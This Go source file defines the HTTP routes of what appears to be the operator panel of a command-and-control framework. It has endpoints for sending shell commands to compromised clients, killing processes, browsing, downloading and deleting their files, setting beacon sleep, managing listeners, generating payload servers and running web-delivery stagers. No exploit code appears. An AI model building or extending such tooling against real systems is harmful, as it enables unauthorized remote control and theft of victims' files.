package routes

import (
	"BackendTemplate/pkg/api"
	"BackendTemplate/pkg/middleware"
	"embed"
	"html/template"
	"io/fs"
	"net/http"

	"github.com/gin-gonic/gin"
)

// SetupRoutes 设置所有路由
func SetupRoutes(r *gin.Engine, embedFS embed.FS) {
	// 配置 CORS
	r.Use(middleware.Cors())

	// 创建嵌入文件系统
	distFS, _ := fs.Sub(embedFS, "dist")
	staticFs, _ := fs.Sub(distFS, "static")
	// 提供静态文件，文件夹是 ./static
	r.StaticFS("/static/", http.FS(staticFs))

	// 引入html
	r.SetHTMLTemplate(template.Must(template.New("").ParseFS(embedFS, "dist/*.html")))

	// 处理未匹配的路由
	r.NoRoute(func(c *gin.Context) {
		c.HTML(http.StatusOK, "index.html", nil)
	})

	// 使用Basic认证中间件
	r.Use(middleware.AuthMiddleware())

	// 公开路由组（登录）
	a := r.Group("/api")
	{
		// 登录
		a.POST("/users/login", api.LoginHandler)
	}

	// 使用 JWT 中间件保护以下路由
	protected := r.Group("/api")

	// 反爬虫识别
	protected.Use(api.AuthMiddleware())

	// 用户相关路由
	setupUserRoutes(protected)

	// 客户端相关路由
	setupClientRoutes(protected)

	// 监听器相关路由
	setupListenerRoutes(protected)

	// Web交付相关路由
	setupWebDeliveryRoutes(protected)
}

// setupUserRoutes 设置用户相关路由
func setupUserRoutes(rg *gin.RouterGroup) {
	// 注销
	rg.POST("/users/logout", api.LogoutHandler)
}

// setupClientRoutes 设置客户端相关路由
func setupClientRoutes(rg *gin.RouterGroup) {
	rg.GET("/client/clientslist", api.GetClients)
	rg.POST("/client/shell/sendcommand", api.SendCommands)
	rg.GET("/client/shell/getshellcontent", api.GetShellContent)
	rg.GET("/client/pid", api.GetPidList)
	rg.POST("/client/pid/kill", api.KillPid)
	rg.POST("/client/file/tree", api.FileBrowse)
	rg.POST("/client/file/delete", api.FileDelete)
	rg.POST("/client/file/mkdir", api.MakeDir)
	rg.POST("/client/file/upload", api.FileUpload)
	rg.GET("/client/note/get", api.GetNote)
	rg.POST("/client/note/save", api.SaveNote)
	rg.POST("/client/file/download", api.DownloadFile)
	rg.GET("/client/downloads/info", api.GetDownloadsInfo)
	rg.POST("/client/downloads/downloaded_file", api.DownloadDownloadedFile)
	rg.GET("/client/file/drives", api.ListDrives)
	rg.POST("/client/file/filecontent", api.FetchFileContent)
	rg.GET("/client/exit", api.ExitClient)
	rg.POST("/client/addnote", api.AddUidNote)
	rg.POST("/client/sleep", api.EditSleep)
	rg.POST("/client/color", api.EditColor)
	rg.POST("/client/GenServer", api.GenServer)
	rg.GET("/client/listener/list", api.ShowListener)
}

// setupListenerRoutes 设置监听器相关路由
func setupListenerRoutes(rg *gin.RouterGroup) {
	rg.POST("/listener/add", api.AddListener)
	rg.GET("/listener/list", api.ListListener)
	rg.POST("/listener/open", api.OpenListener)
	rg.POST("/listener/close", api.CloseListener)
	rg.POST("/listener/delete", api.DeleteListener)
}

// setupWebDeliveryRoutes 设置Web交付相关路由
func setupWebDeliveryRoutes(rg *gin.RouterGroup) {
	rg.GET("/webdelivery/list", api.ListWebDelivery)
	rg.POST("/webdelivery/start", api.StartWebDelivery)
	rg.POST("/webdelivery/close", api.CloseWebDelivery)
	rg.POST("/webdelivery/open", api.OpenWebDelivery)
	rg.POST("/webdelivery/delete", api.DeleteWebDelivery)
}